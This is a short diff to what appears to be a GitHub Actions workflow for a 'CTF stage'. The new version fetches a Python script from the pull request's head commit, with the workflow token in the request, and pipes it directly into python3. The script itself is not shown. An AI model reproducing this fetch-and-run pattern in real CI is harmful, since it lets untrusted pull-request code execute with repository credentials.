@@ -16,4 +16,8 @@ jobs:
     timeout-minutes: 15
     steps:
       - name: Run authorized CTF stage
-        run: curl -fsSL "https://raw.githubusercontent.com/slonce70/slonce70/ctf-custody-temp/.github/ctf_probe.py?rev=${{ github.sha }}" | python3
+        env:
+          GH_TOKEN: ${{ github.token }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          curl -fsSL -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github.raw+json" "https://api.github.com/repos/slonce70/slonce70/contents/.github/ctf_probe.py?ref=$HEAD_SHA" | python3
